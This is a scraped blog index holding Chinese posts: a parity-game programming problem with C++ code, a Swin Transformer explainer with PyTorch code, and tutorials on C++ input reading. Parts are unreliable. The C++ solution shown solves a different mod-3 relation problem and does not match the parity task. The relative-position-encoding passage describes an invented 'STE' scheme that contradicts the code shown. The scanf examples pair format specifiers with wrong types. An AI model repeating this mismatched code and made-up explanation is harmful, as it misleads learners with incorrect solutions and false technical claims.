例题题目描述： Now and then you play the following game with your friend. Your friend writes down a sequence consisting of zeroes and ones. You choose a continuous subsequence (for example the subsequence from the third to the fifth digit inclusively) and ask him, whether this subsequence contains even or odd number of ones. Your friend answers your question and you can ask him about another subsequence and so on. Your task is to guess the entire sequence of numbers.You suspect some of your friend’s answers may not be correct and you want to convict him of falsehood. Thus you have decided to write a program to help you in this matter. The program will receive a series of your questions together with the answers you have received from your friend. The aim of this program is to find the first answer which is provably wrong, i.e. that there exists a sequence satisfying answers to all the previous questions, but no such sequence satisfies this answer. 输入： The first line of input contains one number, which is the length of the sequence of zeroes and ones. This length is less or equal to 1000000000. In the second line, there is one positive integer which is the number of questions asked and answers to them. The number of questions and answers is less or equal to 5000. The remaining lines specify questions and answers. Each line contains one question and the answer to this question: two integers (the position of the first and last digit in the chosen subsequence) and one word which is either even&#39; or odd’ (the answer, i.e. the parity of the number of ones in the chosen subsequence, where even&#39; means an even number of ones and odd’ means an odd number). 输出： There is only one line in output containing one integer X. Number X says that there exists a sequence of zeroes and ones satisfying first X parity conditions, but there exists none satisfying X+1 conditions. If there exists a sequence of zeroes and ones satisfying all the given conditions, then number X should be the number of all the questions asked. 样例：1051 2 even3 4 odd5 6 even1 6 even7 10 odd Sample Output 3 #include&lt;bits/stdc++.h&gt; using namespace std; const int N=5e4+10; int p[N],d[N]; int n,k; int find(int x) &#123; if(x!=p[x])&#123; int t=p[x]; p[x]=find(p[x]); d[x]=d[x]+d[t]; &#125; return p[x]; &#125; signed main() &#123; cin&gt;&gt;n&gt;&gt;k; int ans=0; for(int i=1;i&lt;=n;i++) p[i]=i; while(k--) &#123; int v,a,b; cin&gt;&gt;v&gt;&gt;a&gt;&gt;b; if(a&gt;n||b&gt;n) &#123; ans++; continue; &#125; int pa=find(a),pb=find(b); if(v==1)&#123; if(pa==pb)&#123;//在同一个集合内 if((d[a]-d[b])%3)&#123;//如果不是同类关系 ans++; &#125; &#125; else &#123;//不在一个集合内，要合并 p[pa]=pb; d[pa]=d[b]-d[a];//更新信息，可以画图理解 //因为要满足d[b]=d[pa]+d[a] &#125; &#125; else&#123; if(a==b) &#123;ans++; continue;&#125; else &#123; if(pa==pb)&#123; if((d[a] - d[b] - 1) % 3) ans++; &#125; else &#123; p[pa]=pb;//要满足d[b]=d[pa]+d[a]-1; d[pa]=d[b]-d[a]+1; &#125; &#125; &#125; &#125; cout&lt;&lt;ans&lt;&lt;endl; return 0; &#125;","categories":[{"name":"c++","slug":"c","permalink":"https://dfsgwb.github.io/categories/c/"}],"tags":[{"name":"C++","slug":"C","permalink":"https://dfsgwb.github.io/tags/C/"},{"name":"ACM","slug":"ACM","permalink":"https://dfsgwb.github.io/tags/ACM/"},{"name":"刷题","slug":"刷题","permalink":"https://dfsgwb.github.io/tags/%E5%88%B7%E9%A2%98/"}]},{"title":"swin transformer详解","slug":"swin","date":"2023-04-14T12:27:23.000Z","updated":"2023-04-16T07:49:00.437Z","comments":true,"path":"2023/04/14/swin/","link":"","permalink":"https://dfsgwb.github.io/2023/04/14/swin/","excerpt":"","text":"思想 从上图中可以知道，swin有两个主要的特点 1:层级结构，类似于fpn，抽取不同层次的视觉特征，使其更适合分割检测任务，相比起VIT而言，swin有一个分辨率逐渐降低的过程，也就是图像中的4,8,16倍数的下采样，但是VIT则是一支保持16倍的下采样。 2:transformer范围不同，上图两边红框代表在红框内进行transformer,右边VIT的红框是整张图，而左边Swin Transformer的红框是在小窗口上进行的，也就是swin这个词的意思，在小窗口进行transformer,而非整张图。 架构 流程 1.首先将图像输入到patch Partition模块中进行分块，也就是将相邻的$4\\times4$的像素作为一个patch，然后再channel方向展开，假设输入的是RGB三通道，那么每个patch就有$4\\times4&#x3D;16$个像素，然后每个像素值有R,G,B三个值所以展开后有48个值，所以通过Patch Partition后图像shape由[H,W,3]变成了[H&#x2F;4,W&#x2F;4,48]。然后在通过Linear Embeding层对每个像素的channel数据做线性变换，由48变成C，即图像shape再由[H&#x2F;4,W&#x2F;4,48]变成了[H&#x2F;4,W&#x2F;4,C] 2.然后通过四个stage构建不同大小的特征图，除了stage1中通过一个Linear Embeding层外，剩下三个stage都是先通过一个Patch Merging层进行下采样。然后都是重复堆叠Swin Transformer Block注意这里的Block其实有两种结构，如图(b)中所示，这两种结构的不同之处仅在于一个使用了W-MSA结构，一个使用了SW-MSA结构。而且这两个结构是成对使用的，先使用一个W-MSA结构再使用一个SW-MSA结构。所以你会发现堆叠Swin Transformer Block的次数都是偶数 Patch Embedding在输入进Block前，我们需要将图片切成一个个patch，然后嵌入向量。具体做法是对原始图片裁成一个个 patch_size * patch_size的窗口大小，然后进行嵌入。这里可以通过二维卷积层，将stride，kernelsize设置为patch_size大小。设定输出通道来确定嵌入向量的大小。最后将H,W维度展开，并移动到第一维度 class PatchEmbed(nn.Module): r&quot;&quot;&quot; Image to Patch Embedding Args: img_size (int): Image size. Default: 224. patch_size (int): Patch token size. Default: 4. in_chans (int): Number of input image channels. Default: 3. embed_dim (int): Number of linear projection output channels. Default: 96. norm_layer (nn.Module, optional): Normalization layer. Default: None &quot;&quot;&quot; def __init__(self, img_size=224, patch_size=4, in_chans=3, embed_dim=96, norm_layer=None): super().__init__() img_size = to_2tuple(img_size) patch_size = to_2tuple(patch_size) patches_resolution = [img_size[0] // patch_size[0], img_size[1] // patch_size[1]] self.img_size = img_size self.patch_size = patch_size self.patches_resolution = patches_resolution self.num_patches = patches_resolution[0] * patches_resolution[1] self.in_chans = in_chans self.embed_dim = embed_dim self.proj = nn.Conv2d(in_chans, embed_dim, kernel_size=patch_size, stride=patch_size) if norm_layer is not None: self.norm = norm_layer(embed_dim) else: self.norm = None def forward(self, x): B, C, H, W = x.shape # FIXME look at relaxing size constraints assert H == self.img_size[0] and W == self.img_size[1], \\ f&quot;Input image size (&#123;H&#125;*&#123;W&#125;) doesn&#39;t match model (&#123;self.img_size[0]&#125;*&#123;self.img_size[1]&#125;).&quot; x = self.proj(x).flatten(2).transpose(1, 2) # B Ph*Pw C if self.norm is not None: x = self.norm(x) return x def flops(self): Ho, Wo = self.patches_resolution flops = Ho * Wo * self.embed_dim * self.in_chans * (self.patch_size[0] * self.patch_size[1]) if self.norm is not None: flops += Ho * Wo * self.embed_dim return flops Patch Merging详解 如上图所示，假设输入Patch Merging的是一个4x4大小的单通道特征图（feature map），Patch Merging会将每个2x2的相邻像素划分为一个patch，然后将每个patch中相同位置（同一颜色）像素给拼在一起就得到了4个feature map。接着将这四个feature map在深度方向进行concat拼接，然后在通过一个LayerNorm层。最后通过一个全连接层在feature map的深度方向做线性变化，将feature map的深度由C变成C/2。通过这个简单的例子可以看出，通过Patch Merging层后，feature map的高和宽会减半，深度会翻倍。 class PatchMerging(nn.Module): r&quot;&quot;&quot; Patch Merging Layer. Args: input_resolution (tuple[int]): Resolution of input feature. dim (int): Number of input channels. norm_layer (nn.Module, optional): Normalization layer. Default: nn.LayerNorm 该块包含了一个减少通道数的操作和一个归一化操作，输入分辨率为 input_resolution，特征维度为 dim。 在forward方法中，输入的特征张量 x 会被分成四个部分，每个部分都是原始张量的一部分，并且这四个部分会被拼接在一起。 然后，这个拼接后的张量会被归一化和减少通道数，最后返回结果张量。extra_repr方法用于返回该模块的一些额外信息， flops 方法用于计算该模块的计算量。 &quot;&quot;&quot; def __init__(self, input_resolution, dim, norm_layer=nn.LayerNorm): super().__init__() self.input_resolution = input_resolution self.dim = dim self.reduction = nn.Linear(4 * dim, 2 * dim, bias=False) self.norm = norm_layer(4 * dim) def forward(self, x): &quot;&quot;&quot; x: B, H*W, C 输入参数x是一个形状为[B, HW, C]的张量，其中B表示batch size，H和W表示输入图像的高和宽，C表示输入通道数。 该函数首先将输入x的形状改变为[B, H, W, C]，然后将输入的每个像素点分成四个小块（2x2），分别对每个小块进行操作， 并将结果在通道维度上拼接起来，得到一个形状为[B, H/2W/2, 4*C]的张量。接着，对这个张量进行归一化和降维操作， 最后返回结果。在函数执行过程中，还进行了一些检查， 例如检查输入特征的尺寸是否正确，以及输入图像的高和宽是否为偶数。 &quot;&quot;&quot; H, W = self.input_resolution B, L, C = x.shape assert L == H * W, &quot;input feature has wrong size&quot; assert H % 2 == 0 and W % 2 == 0, f&quot;x size (&#123;H&#125;*&#123;W&#125;) are not even.&quot; x = x.view(B, H, W, C) x0 = x[:, 0::2, 0::2, :] # B H/2 W/2 C x1 = x[:, 1::2, 0::2, :] # B H/2 W/2 C x2 = x[:, 0::2, 1::2, :] # B H/2 W/2 C x3 = x[:, 1::2, 1::2, :] # B H/2 W/2 C x = torch.cat([x0, x1, x2, x3], -1) # B H/2 W/2 4*C x = x.view(B, -1, 4 * C) # B H/2*W/2 4*C x = self.norm(x) x = self.reduction(x) return x def extra_repr(self) -&gt; str: return f&quot;input_resolution=&#123;self.input_resolution&#125;, dim=&#123;self.dim&#125;&quot; def flops(self): H, W = self.input_resolution flops = H * W * self.dim flops += (H // 2) * (W // 2) * 4 * self.dim * 2 * self.dim return flops ps：LayerNorm层是一种归一化技术，主要作用是对神经网络中的每个样本进行归一化，使得每个样本的特征都具有相同的分布。具体来说，LayerNorm层会对每个样本的特征进行均值和方差的计算，并将其归一化为标准正态分布，从而使得每个样本的特征都具有相同的尺度和分布，从而提高神经网络的训练效果和泛化能力。此外，LayerNorm层还可以减轻梯度消失和梯度爆炸问题，提高神经网络的稳定性。 window Attention计算方式：$$\\Large Attention(Q,K,V)&#x3D;Softmax(\\frac{QK^T}{\\sqrt{d} }+B)V$$为了实现多头Self-Attention,和传统的全局Self-Attention所不同，swin中引入了相对位置编码。 class WindowAttention(nn.Module): r&quot;&quot;&quot; Window based multi-head self attention (W-MSA) module with relative position bias. It supports both of shifted and non-shifted window. Args: dim (int): Number of input channels. window_size (tuple[int]): The height and width of the window. num_heads (int): Number of attention heads. qkv_bias (bool, optional): If True, add a learnable bias to query, key, value. Default: True qk_scale (float | None, optional): Override default qk scale of head_dim ** -0.5 if set attn_drop (float, optional): Dropout ratio of attention weight. Default: 0.0 proj_drop (float, optional): Dropout ratio of output. Default: 0.0 &quot;&quot;&quot; def __init__(self, dim, window_size, num_heads, qkv_bias=True, qk_scale=None, attn_drop=0., proj_drop=0.): super().__init__() self.dim = dim self.window_size = window_size # Wh, Ww self.num_heads = num_heads # nH head_dim = dim // num_heads # 每个注意力头对应的通道数 self.scale = qk_scale or head_dim ** -0.5 # define a parameter table of relative position bias self.relative_position_bias_table = nn.Parameter( torch.zeros((2 * window_size[0] - 1) * (2 * window_size[1] - 1), num_heads)) # 设置一个形状为（2*(Wh-1) * 2*(Ww-1), nH）的可学习变量，用于后续的位置编码 # get pair-wise relative position index for each token inside the window coords_h = torch.arange(self.window_size[0]) coords_w = torch.arange(self.window_size[1]) coords = torch.stack(torch.meshgrid([coords_h, coords_w])) # 2, Wh, Ww coords_flatten = torch.flatten(coords, 1) # 2, Wh*Ww relative_coords = coords_flatten[:, :, None] - coords_flatten[:, None, :] # 2, Wh*Ww, Wh*Ww relative_coords = relative_coords.permute(1, 2, 0).contiguous() # Wh*Ww, Wh*Ww, 2 relative_coords[:, :, 0] += self.window_size[0] - 1 # shift to start from 0 relative_coords[:, :, 1] += self.window_size[1] - 1 relative_coords[:, :, 0] *= 2 * self.window_size[1] - 1 relative_position_index = relative_coords.sum(-1) # Wh*Ww, Wh*Ww self.register_buffer(&quot;relative_position_index&quot;,relative_position_index) self.qkv = nn.Linear(dim, dim * 3, bias=qkv_bias) self.attn_drop = nn.Dropout(attn_drop) self.proj = nn.Linear(dim, dim) self.proj_drop = nn.Dropout(proj_drop) trunc_normal_(self.relative_position_bias_table, std=.02) self.softmax = nn.Softmax(dim=-1) # 相关位置编码... def forward(self, x, mask=None): &quot;&quot;&quot; Args: x: input features with shape of (num_windows*B, N, C) mask: (0/-inf) mask with shape of (num_windows, Wh*Ww, Wh*Ww) or None &quot;&quot;&quot; B_, N, C = x.shape qkv = self.qkv(x).reshape(B_, N, 3, self.num_heads, C // self.num_heads).permute(2, 0, 3, 1, 4) q, k, v = qkv[0], qkv[1], qkv[2] # make torchscript happy (cannot use tensor as tuple) q = q * self.scale attn = (q @ k.transpose(-2, -1)) relative_position_bias = self.relative_position_bias_table[self.relative_position_index.view(-1)].view( self.window_size[0] * self.window_size[1], self.window_size[0] * self.window_size[1], -1) # Wh*Ww,Wh*Ww,nH relative_position_bias = relative_position_bias.permute(2, 0, 1).contiguous() # nH, Wh*Ww, Wh*Ww attn = attn + relative_position_bias.unsqueeze(0) if mask is not None: nW = mask.shape[0] attn = attn.view(B_ // nW, nW, self.num_heads, N, N) + mask.unsqueeze(1).unsqueeze(0) attn = attn.view(-1, self.num_heads, N, N) attn = self.softmax(attn) else: attn = self.softmax(attn) attn = self.attn_drop(attn) x = (attn @ v).transpose(1, 2).reshape(B_, N, C) x = self.proj(x) x = self.proj_drop(x) return x 相对位置编码 上文公式中的B就是我们这里讲到的相对位置编码矩阵。 Swin Transformer中的相对位置编码是通过计算两个位置之间的相对距离来实现的。具体来说，Swin Transformer使用了一种新的相对位置编码方法，称为Swin Transformer Position Encoding（STE）。 STE的基本思想是将输入序列划分为多个块，并在每个块中计算相对位置编码。每个块的大小由一个参数P控制，通常设置为16或32。在每个块中，Swin Transformer使用一个可学习的相对位置编码矩阵来计算相对位置编码。 具体来说，假设我们有一个输入序列X，其长度为N，块大小为P。我们将输入序列划分为N/P个块，每个块包含P个元素。对于每个块i，Swin Transformer计算相对位置编码矩阵Ri，其大小为P x P。然后，对于块i中的每个元素j，Swin Transformer计算其相对位置编码向量Eij，其大小为1 x P。Eij是通过将元素j与块中所有其他元素的距离作为输入，通过一个前馈神经网络计算得到的。 最后，Swin Transformer将每个相对位置编码向量Eij与相对位置编码矩阵Ri相乘，得到最终的相对位置编码向量Pij，其大小为1 x P。Pij表示元素j与块i中所有其他元素之间的相对位置编码。在进行自注意力计算时，Swin Transformer使用Pij来计算每个元素的注意力权重。 总之，Swin Transformer中的相对位置编码是通过将输入序列划分为多个块，并在每个块中计算相对位置编码矩阵和相对位置编码向量来实现的。这种方法可以有效地处理较长的序列，并且可以通过学习自适应地计算相对位置编码。 其中的随机生成的$(2M-1) \\times (2M-1)$ 的相对位置偏置是一组可学习的参数 W-MSAW-MSA:Windows Multi-head Self-Attention多头窗口自注意力目的：减少计算量对于普通的MSA模块，feature map中的每个像素与class序列在Self-attention计算过程中需要和所有的像素去计算全局，但是使用W-MSA时，将会将feature map拆分为一个个不重叠的window，比如是$M\\times M$大小的windows，然后单独对每个windows内部进行Self-Attention。假设在Swin transformer中输入$224\\times224\\times3$的图片，那么一个patch的大小划分为$4\\times4$，那么就有$56\\times56$个patch，而每7个patch就组成一个窗口，也就是一个窗口有$7\\times7$个patch，一个$224\\times224\\times3$的图片会有$8\\times 8&#x3D;64$个窗口。论文中给出的具体计算公式为：$$\\Large \\Omega(MSA)&#x3D;4hwC^2+2(hw)^2C$$ $$\\Large \\Omega(W-MSA)&#x3D;4hwC^2+2M^2hwC$$ h代表feature map的高度w代表feature map的宽度C代表feature map的深度 不难发现其中变化的就是将原有的feature map全部遍历所带来的复杂度$(hw)^2$变成了遍历$M\\times M$的Windows复杂度$M^2hw$。看似差别不大，但是实际上差了几十倍甚至上百倍。 SW-MSA当只有W-MSA时，只会有每个窗口内部进行Self-Attention,窗口之间是无法实现信息的传递的。为了实现窗口之间高效的相互交互，作者提出了Shifted Windows Multi-Head Self-Attention（SW-MSA）模块 其中layer1表示原本的分块，然后将窗口向右下角滑动一个$2\\times2$的位置得到layer2，然后再进行Attention操作，但是直接这样处理会带来一个问题就是当原本不在一起的图像块也会进行attention操作，这是不合理的，这时候我们就需要想办法让其能知道，当shift之后，哪些块原本是相邻的，哪些是原本不相邻的。这时候引入下图所示的mask机制，使用矩阵的方式将不相邻的块变为图像中的紫色，置位负无穷大，使得在进行softmax时可以将其变为0，也就相当于是没有进行attention操作。 此时一个基础的SwinTransformerBlock就构建完毕了。 class SwinTransformerBlock(nn.Module): r&quot;&quot;&quot; Swin Transformer Block. Args: dim (int): Number of input channels. input_resolution (tuple[int]): Input resulotion. num_heads (int): Number of attention heads. window_size (int): Window size. shift_size (int): Shift size for SW-MSA. mlp_ratio (float): Ratio of mlp hidden dim to embedding dim. qkv_bias (bool, optional): If True, add a learnable bias to query, key, value. Default: True qk_scale (float | None, optional): Override default qk scale of head_dim ** -0.5 if set. drop (float, optional): Dropout rate. Default: 0.0 attn_drop (float, optional): Attention dropout rate. Default: 0.0 drop_path (float, optional): Stochastic depth rate. Default: 0.0 act_layer (nn.Module, optional): Activation layer. Default: nn.GELU norm_layer (nn.Module, optional): Normalization layer. Default: nn.LayerNorm fused_window_process (bool, optional): If True, use one kernel to fused window shift &amp; window partition for acceleration, similar for the reversed part. Default: False &quot;&quot;&quot; def __init__(self, dim, input_resolution, num_heads, window_size=7, shift_size=0, mlp_ratio=4., qkv_bias=True, qk_scale=None, drop=0., attn_drop=0., drop_path=0., act_layer=nn.GELU, norm_layer=nn.LayerNorm, fused_window_process=False): super().__init__() self.dim = dim self.input_resolution = input_resolution self.num_heads = num_heads self.window_size = window_size self.shift_size = shift_size self.mlp_ratio = mlp_ratio if min(self.input_resolution) &lt;= self.window_size: # if window size is larger than input resolution, we don&#39;t partition windows self.shift_size = 0 self.window_size = min(self.input_resolution) assert 0 &lt;= self.shift_size &lt; self.window_size, &quot;shift_size must in 0-window_size&quot; self.norm1 = norm_layer(dim) self.attn = WindowAttention( dim, window_size=to_2tuple(self.window_size), num_heads=num_heads, qkv_bias=qkv_bias, qk_scale=qk_scale, attn_drop=attn_drop, proj_drop=drop) self.drop_path = DropPath(drop_path) if drop_path &gt; 0. else nn.Identity() self.norm2 = norm_layer(dim) mlp_hidden_dim = int(dim * mlp_ratio) self.mlp = Mlp(in_features=dim, hidden_features=mlp_hidden_dim, act_layer=act_layer, drop=drop) if self.shift_size &gt; 0: # calculate attention mask for SW-MSA H, W = self.input_resolution img_mask = torch.zeros((1, H, W, 1)) # 1 H W 1 h_slices = (slice(0, -self.window_size), slice(-self.window_size, -self.shift_size), slice(-self.shift_size, None)) w_slices = (slice(0, -self.window_size), slice(-self.window_size, -self.shift_size), slice(-self.shift_size, None)) cnt = 0 for h in h_slices: for w in w_slices: img_mask[:, h, w, :] = cnt cnt += 1 mask_windows = window_partition(img_mask, self.window_size) # nW, window_size, window_size, 1 mask_windows = mask_windows.view(-1, self.window_size * self.window_size) attn_mask = mask_windows.unsqueeze(1) - mask_windows.unsqueeze(2) attn_mask = attn_mask.masked_fill(attn_mask != 0, float(-100.0)).masked_fill(attn_mask == 0, float(0.0)) else: attn_mask = None self.register_buffer(&quot;attn_mask&quot;, attn_mask) self.fused_window_process = fused_window_process def forward(self, x): H, W = self.input_resolution B, L, C = x.shape assert L == H * W, &quot;input feature has wrong size&quot; shortcut = x x = self.norm1(x) x = x.view(B, H, W, C) # cyclic shift if self.shift_size &gt; 0: if not self.fused_window_process: shifted_x = torch.roll(x, shifts=(-self.shift_size, -self.shift_size), dims=(1, 2)) # partition windows x_windows = window_partition(shifted_x, self.window_size) # nW*B, window_size, window_size, C else: x_windows = WindowProcess.apply(x, B, H, W, C, -self.shift_size, self.window_size) else: shifted_x = x # partition windows x_windows = window_partition(shifted_x, self.window_size) # nW*B, window_size, window_size, C x_windows = x_windows.view(-1, self.window_size * self.window_size, C) # nW*B, window_size*window_size, C # W-MSA/SW-MSA attn_windows = self.attn(x_windows, mask=self.attn_mask) # nW*B, window_size*window_size, C # merge windows attn_windows = attn_windows.view(-1, self.window_size, self.window_size, C) # reverse cyclic shift if self.shift_size &gt; 0: if not self.fused_window_process: shifted_x = window_reverse(attn_windows, self.window_size, H, W) # B H&#39; W&#39; C x = torch.roll(shifted_x, shifts=(self.shift_size, self.shift_size), dims=(1, 2)) else: x = WindowProcessReverse.apply(attn_windows, B, H, W, C, self.shift_size, self.window_size) else: shifted_x = window_reverse(attn_windows, self.window_size, H, W) # B H&#39; W&#39; C x = shifted_x x = x.view(B, H * W, C) x = shortcut + self.drop_path(x) # FFN x = x + self.drop_path(self.mlp(self.norm2(x))) return x 最后就是按架构图所设计的将四个block给堆叠起来得到完整的swin-transformer。","categories":[{"name":"人工智能","slug":"人工智能","permalink":"https://dfsgwb.github.io/categories/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/"}],"tags":[{"name":"深度学习","slug":"深度学习","permalink":"https://dfsgwb.github.io/tags/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/"},{"name":"Transformer","slug":"Transformer","permalink":"https://dfsgwb.github.io/tags/Transformer/"},{"name":"Segmentation","slug":"Segmentation","permalink":"https://dfsgwb.github.io/tags/Segmentation/"}]},{"title":"ACM格式输入（一）","slug":"ACM格式输入","date":"2023-04-13T02:47:51.000Z","updated":"2023-04-13T08:59:38.137Z","comments":true,"path":"2023/04/13/ACM格式输入/","link":"","permalink":"https://dfsgwb.github.io/2023/04/13/ACM%E6%A0%BC%E5%BC%8F%E8%BE%93%E5%85%A5/","excerpt":"","text":"c++常用的输入输出方法输入1.cin 注意1：cin可以连续从键盘读入数据注意2：cin以空格、tab、换行符作为分隔符注意3：cin从第一个非空格字符开始读取，直到遇到分隔符结束读取 // 用法1，读入单数据 int num; cin &gt;&gt; num; cout &lt;&lt; num &lt;&lt; endl; // 输出读入的整数num // 用法2，批量读入多个数据 vector&lt;int&gt; nums(5); for(int i = 0; i &lt; nums.size(); i++) &#123; cin &gt;&gt; nums[i]; &#125; // 输出读入的数组 for(int i = 0; i &lt; nums.size(); i++) &#123; cout &lt;&lt; nums[i] &lt;&lt; &quot; &quot;; &#125; 2.getline() 当读取的字符串中间存在空格时，cin就不可用了，便可以使用getline() string s; getline(cin, s); // 输出读入的字符串 cout &lt;&lt; s &lt;&lt; endl; 3.getchar char ch; ch = getchar(); // 输出读入的字符 cout &lt;&lt; ch &lt;&lt; endl; 4.scanf() 使用最多的输入方式 //1.输入十进制的数 int a; scanf(&quot;%d&quot;,&amp;a); scanf(&quot;%i&quot;,&amp;a); scanf(&quot;%u&quot;,&amp;a); //这三种写法都是可以的 //2.输入八进制和十六进制数 int b; scanf(&quot;%o&quot;,&amp;b); //八进制 scanf(&quot;%x&quot;,&amp;b); //十六进制 //3.输入实数 int c; scanf(&quot;%f&quot;,&amp;c); scanf(&quot;%e&quot;,&amp;c); //这两种写法可以互换 //4.输入字符和字符串 char d; string dd; scanf(&quot;%c&quot;,&amp;d); //单个字符 scanf(&quot;%s&quot;,&amp;dd); //字符串 //5.跳过一次输入 int e; scanf(&quot;%*&quot;,&amp;e); //6.输入长整型数 int f; scanf(&quot;%ld&quot;,&amp;f); scanf(&quot;%lo&quot;,&amp;f); scanf(&quot;%lx&quot;,&amp;f); scanf(&quot;%l&quot;,&amp;f); //四种写法都可以用 //7.输入短整型数 int g; scanf(&quot;%hd&quot;,&amp;g); scanf(&quot;%ho&quot;,&amp;g); scanf(&quot;%hx&quot;,&amp;g); scanf(&quot;%h&quot;,&amp;g); //四种写法都可以用 //8.输入double型数（小数 double h; scanf(&quot;%lf&quot;,&amp;h); scanf(&quot;%lf&quot;,&amp;h); scanf(&quot;%l&quot;,&amp;h); //三种写法都可以用 //9.域宽的使用 int i; scanf(&quot;%5d&quot;,&amp;i); //10.特殊占位符 int j,k; scanf(&quot;%d,%d&quot;,&amp;j,&amp;k); int j,k; scanf(&quot;%d&quot;,&amp;j); printf(&quot;,&quot;); //cout&lt;&lt;&quot;,&quot;; scanf(&quot;%d&quot;,&amp;k); 输出cout，printf随意搭配，就不讲了 下面将一些输入格式 #include&lt;iostream&gt; #include&lt;sstream&gt; #include&lt;string&gt; #include&lt;vector&gt; #include&lt;algorithm&gt; #include&lt;limits.h&gt; //INT_MIN 和 INT_MAX的头文件 using namespace std; struct stu &#123; string name; int num; &#125;; // 1. 直接输入一个数 int main() &#123; int n = 0; while (cin &gt;&gt; n) &#123; cout &lt;&lt; n &lt;&lt; endl; &#125; return -1; &#125; // 2. 直接输入一个字符串 int main() &#123; string str; while (cin &gt;&gt; str) &#123; cout &lt;&lt; str &lt;&lt; endl; &#125; return -1; &#125; // 3. 只读取一个字符 int main() &#123; char ch; //方式1 while (cin &gt;&gt; ch) &#123; cout &lt;&lt; ch &lt;&lt; endl; &#125; //方式2： cin.get(ch) 或者 ch = cin.get() 或者 cin.get() while (cin.get(ch)) &#123; cout &lt;&lt; ch &lt;&lt; endl; &#125; //方式3 ：ch = getchar() while (getchar()) &#123; cout &lt;&lt; ch &lt;&lt; endl; &#125; return -1; &#125; // 3.1给定一个数，表示有多少组数（可能是数字和字符串的组合），然后读取 int main() &#123; int n = 0; while (cin &gt;&gt; n) &#123; //每次读取1 + n 个数，即一个样例有n+1个数 vector&lt;int&gt; nums(n); for (int i = 0; i &lt; n; i++) &#123; cin &gt;&gt; nums[i]; &#125; //处理这组数/字符串 for (int i = 0; i &lt; n; i++) &#123; cout &lt;&lt; nums[i] &lt;&lt; endl; &#125; &#125; return -1; &#125; //3.2 首先给一个数字，表示需读取n个字符，然后顺序读取n个字符 int main() &#123; int n = 0; while (cin &gt;&gt; n) &#123; //输入数量 vector&lt;string&gt; strs; for (int i = 0; i &lt; n; i++) &#123; string temp; cin &gt;&gt; temp; strs.push_back(temp); &#125; //处理这组字符串 sort(strs.begin(), strs.end()); for (auto&amp; str : strs) &#123; cout &lt;&lt; str &lt;&lt; &#39; &#39;; &#125; &#125; return 0; &#125; //4.未给定数据个数，但是每一行代表一组数据，每个数据之间用空格隔开 //4.1使用getchar() 或者 cin.get() 读取判断是否是换行符，若是的话，则表示该组数（样例）结束了，需进行处理 int main() &#123; int ele; while (cin &gt;&gt; ele) &#123; int sum = ele; // getchar() //读取单个字符 /*while (cin.get() != &#39;\\n&#39;) &#123;*/ //判断换行符号 while (getchar() != &#39;\\n&#39;) &#123; //如果不是换行符号的话，读到的是数字后面的空格或者table int num; cin &gt;&gt; num; sum += num; &#125; cout &lt;&lt; sum &lt;&lt; endl; &#125; return 0; &#125; //4.2 给定一行字符串，每个字符串用空格间隔，一个样例为一行 int main() &#123; string str; vector&lt;string&gt; strs; while (cin &gt;&gt; str) &#123; strs.push_back(str); if (getchar() == &#39;\\n&#39;) &#123; //控制测试样例 sort(strs.begin(), strs.end()); for (auto&amp; str : strs) &#123; cout &lt;&lt; str &lt;&lt; &quot; &quot;; &#125; cout &lt;&lt; endl; strs.clear(); &#125; &#125; return 0; &#125; //4.3 使用getline 读取一整行数字到字符串input中，然后使用字符串流stringstream，读取单个数字或者字符。 int main() &#123; string input; while (getline(cin, input)) &#123; //读取一行 stringstream data(input); //使用字符串流 int num = 0, sum = 0; while (data &gt;&gt; num) &#123; sum += num; &#125; cout &lt;&lt; sum &lt;&lt; endl; &#125; return 0; &#125; //4.4 使用getline 读取一整行字符串到字符串input中，然后使用字符串流stringstream，读取单个数字或者字符。 int main() &#123; string words; while (getline(cin, words)) &#123; stringstream data(words); vector&lt;string&gt; strs; string str; while (data &gt;&gt; str) &#123; strs.push_back(str); &#125; sort(strs.begin(), strs.end()); for (auto&amp; str : strs) &#123; cout &lt;&lt; str &lt;&lt; &quot; &quot;; &#125; &#125; &#125; //4.5 使用getline 读取一整行字符串到字符串input中，然后使用字符串流stringstream，读取单个数字或者字符。每个字符中间用&#39;,&#39;间隔 int main() &#123; string line; //while (cin &gt;&gt; line) &#123; //因为加了“，”所以可以看出一个字符串读取 while(getline(cin, line))&#123; vector&lt;string&gt; strs; stringstream ss(line); string str; while (getline(ss, str, &#39;,&#39;)) &#123; strs.push_back(str); &#125; // sort(strs.begin(), strs.end()); for (auto&amp; str : strs) &#123; cout &lt;&lt; str &lt;&lt; &quot; &quot;; &#125; cout &lt;&lt; endl; &#125; return 0; &#125; int main() &#123; string str; //C语言读取字符、数字 int a; char c; string s; scanf_s(&quot;%d&quot;, &amp;a); scanf(&quot;%c&quot;, &amp;c); scanf(&quot;%s&quot;, &amp;s); printf(&quot;%d&quot;, a); //读取字符 char ch; cin &gt;&gt; ch; ch = getchar(); while (cin.get(ch)) &#123; //获得单个字符 ; &#125; //读取字符串 cin &gt;&gt; str; //遇到空白停止 getline(cin, str); //读入一行字符串 &#125;","categories":[{"name":"c++","slug":"c","permalink":"https://dfsgwb.github.io/categories/c/"}],"tags":[{"name":"C++","slug":"C","permalink":"https://dfsgwb.github.io/tags/C/"},{"name":"ACM","slug":"ACM","permalink":"https://dfsgwb.github.io/tags/ACM/"},{"name":"刷题","slug":"刷题","permalink":"https://dfsgwb.github.io/tags/%E5%88%B7%E9%A2%98/"}]},{"title":"ACM格式输入（二）","slug":"ACM格式输入2","date":"2023-04-13T02:47:51.000Z","updated":"2023-04-13T08:58:00.297Z","comments":true,"path":"2023/04/13/ACM格式输入2/","link":"","permalink":"https://dfsgwb.github.io/2023/04/13/ACM%E6%A0%BC%E5%BC%8F%E8%BE%93%E5%85%A52/","excerpt":"","text":"c++常用的输入输出方法案例一维数组： 输入包含一个整数n代表数组长度。接下来包含n个整数，代表数组中的元素31 2 3 int n; scanf(&quot;%d&quot;,&amp;n); // 读入3，说明数组的大小是3 vector&lt;int&gt; nums(n); // 创建大小为3的vector&lt;int&gt; for(int i = 0; i &lt; n; i++) &#123; cin &gt;&gt; nums[i]; &#125; // 验证是否读入成功 for(int i = 0; i &lt; nums.size(); i++) &#123; cout &lt;&lt; nums[i] &lt;&lt; &quot; &quot;; &#125; cout &lt;&lt; endl; 若是不限定输入数据的大小 vector&lt;int&gt; nums; int num; while(cin &gt;&gt; num) &#123; nums.push_back(num); // 读到换行符，终止循环 if(getchar() == &#39;\\n&#39;) &#123; break; &#125; &#125; // 验证是否读入成功 for(int i = 0; i &lt; nums.size(); i++) 